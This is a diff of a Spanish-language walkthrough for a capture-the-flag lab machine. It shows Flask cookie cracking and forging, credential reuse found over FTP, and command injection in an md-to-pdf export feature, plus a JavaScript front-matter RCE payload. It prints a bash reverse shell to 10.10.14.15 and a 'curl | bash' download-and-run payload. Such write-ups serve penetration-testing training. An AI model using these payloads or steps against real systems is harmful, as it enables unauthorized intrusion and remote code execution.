@@ -11,28 +11,22 @@ Puertos abiertos 21(ftp), 22(ssh) y 5000(http)
 # Parte 1: Reconocimiento Web
 
 Es una web de notas, como va por Python es muy probable que haya un STTI.
-
-En el apartado /VIP dice que **No pueden dar membresias por un problema en el backend**
-
-EN /edit_note me sale directamente la 3, como que hay dos notas antes si pongo 1 o 2 da error sql.
+- En el apartado /VIP dice que **No pueden dar membresias por un problema en el backend**
+- EN /edit_note me sale directamente la 3, como que hay dos notas antes si pongo 1 o 2 da error sql.
 
 ```console
 └─$ curl -s http://10.10.11.160:5000/edit_note/1 --cookie "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM"
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>500 Internal Server Error</title>
 ```
+Probamos fuzzing pero no hay resultados.
 
-```console
-└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.160:5000/FUZZ/
-```
 ------------------------------
 
 # Parte 2: Obtencion de un usaurio
 
-La cookie ```eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM```
-se decodifica en ```{"logged_in": true, "username": "cucuxii"}```,  esa es la tipica estrucutra de las 
-cookies de flask.
-
+La cookie ```eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM```se decodifica en 
+```{"logged_in": true, "username": "cucuxii"}```,  esa es la tipica estrucutra de las cookies de flask.
 ```console
 └─$ flask-unsign --unsign --wordlist '/usr/share/wordlists/rockyou.txt' --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM' --no-literal-eval
 [*] Session decodes to: {'logged_in': True, 'username': 'cucuxii'}
@@ -44,9 +38,7 @@ Cuando meto la cookie en la web me da error "Unauthorized" porque el usuario adm
 
 ### Fuzzing panel de login
 
-Como pone "Invalid Crendentials" probe a fuzzear el nombre de usuario (ya que si pongo el mio, que existe, pone
-"Invalid Login")
-
+Como pone "Invalid Crendentials" probe a fuzzear el nombre de usuario (ya que si pongo el mio, que existe, pone "Invalid Login")
 Me cree un sccript para hacer el fuzzing de usaurios:
 ```python3
 #!/bin/python3
@@ -72,13 +64,11 @@ Asi que toca crear su cookie:
 └─$ flask-unsign --sign  --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Y1lyDg.2Rw4NU_I1TDEs6KuZ-bvQ4DPBNU
 ```
-
 Ahora estamos como blue, la nota 2 es esta (la 1 sigue dando server error)
 ```
 * Delete the password note
 * Ask the admin team to change the password
 ```
-
 En notes se ve la 1
 ```
 Hello, Thank you for choosing our premium service. Now you are capable of doing many more things with our 
@@ -106,13 +96,9 @@ Interactive mode off.
 ftp> mget *
 ```
 
-Obtenemos un pdf (policy.pdf) en el que hablan de consejos de seguirdad para la empresa respecto a contraseñas.
-Llama la atención una sección:
-
+Obtenemos un pdf (policy.pdf) en el que hablan de consejos de seguirdad para la empresa respecto a contraseñas. Llama la atención una sección:
 - Las contraseñas por defecto que genera la aplicación están en el formato "nombre@Noter!"
-
-Así que la de ftp_admin debería cumplir este requisito si no se ha cambiado ftp_admin:ftp_admin@Noter!
-
+Así que la de ftp_admin debería cumplir este requisito si no se ha cambiado *ftp_admin:ftp_admin@Noter!* (pero no sirve en el panel de login)
 Nos conectamos por ftp con estas creds, y repetimos el proceso.
 ```console
 └─$ ftp 10.10.11.160
@@ -139,6 +125,7 @@ diff '--color=auto' version1/app.py version2/app.py
 ...
 ```
 Conseguimos las creds -> root:Nildogg36
+
 ------------------------
 
 # Parte 4: Analizando la aplicacion
@@ -182,11 +169,8 @@ def export_note_remote():
 Analizando el codigo tanto en /export_note_local como /export_note_remote se ejecuta el comando:
 ```md-to-pdf.js {nota}```
 
-Al ser un comando ejecutado a nivel de sistema y tener nosotros el control de que nota queremos, podriamos hacer
-un OS command inyection.
-
+Al ser un comando ejecutado a nivel de sistema y tener nosotros el control de que nota queremos, podriamos hacerun OS command inyection.
 Pruebo con local  ```/export_note_local/2; ping -c 1 10.10.14.15``` y me da un internal server error.
-
 Con remote tienes que poner tu la nota, Test:
 ```console
 └─$ echo "Mariscos Recio" > note.md
@@ -194,41 +178,38 @@ Con remote tienes que poner tu la nota, Test:
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.160 - - [27/Oct/2022 10:22:09] "GET /note.md HTTP/1.1" 200 -
 ```
-
 ----------------------
 
 # Parte 5: obteniendo acceso
 
-El codigo dice que:
-```command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"```
+El codigo dice que: ```command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"```
 Es decir dentro de $'' mete el contenido de la nota: ```md_to_pdf $'Mariscos Recio'``` 
 
 El comando con inyeccion seria tal que: ```node md-to-pdf.js $';whoami'```
 Teniendo que escapar del contexto de los ' -> ```node md-to-pdf.js $'';whoami; echo''```
-Lo mismo con ping -> ```'; ping -c 1 10.10.14.15 ;echo' ```
-Recibiendo:
+Lo mismo con ping -> ```'; ping -c 1 10.10.14.15 ;echo' ``` Recibiendo:
+```console
 └─$ sudo tcpdump -i tun0 icmp -n
 10:37:37.601822 IP 10.10.11.160 > 10.10.14.15: ICMP echo request, id 2, seq 1, length 64
 10:37:37.601854 IP 10.10.14.15 > 10.10.11.160: ICMP echo reply, id 2, seq 1, length 64
-
+```
 Tambien buscando la vuln por google te sale como poner el payload:
 ```console
 └─$ cat note.md
 ---js\n((require("child_process")).execSync("ping -c 1 10.10.14.15"))\n---RCE
 ```
-Obtenemos el mismo resultado.
-
+Obtenemos el mismo resultado. Intento varias maneras de hacer una reverse shell, pero todas fallan, asi qie la hago indirecta con curl.
 Shell:
-index.html
+- index.html
 ```bash
 #!/bin/sh
 bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
 ```
-nota:
+- note.md:
 ```---js\n((require("child_process")).execSync("curl http://10.10.14.15:8000 | bash"))\n---RCE```
 
 Con netcat en escucha por el puerto 443 tenemos la shell.
-He importado mi script de enumeracion:
+He importado mi [script de enumeracion](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh):
 - Uusarios -> svc (nosotros) y root
 - /tmp/puppeteer_dev_chrome_profile-mPQ3N6??
 - Tiene abierto el mysql (3306) y por el puerto 39617 el node (para correr el md-to-js)
@@ -266,7 +247,7 @@ del python, no hay mucha diferencia).
 Analizando el codigo fuente de la librería tiene una función que lo que hace es pasarle a system() argumentos.
 System es una libería de C que permite ejecutar comandos en el sistema (y somos root, no lo olvidemos).
 
-La manera de cimpilar esto es cargando las librerias junto al código (asi accede sin depender del contexto).
+La manera de en la que lo ha compilado es creando una librería compartida con ello (o sea un plugin/apendice para un programa)
 
 
 
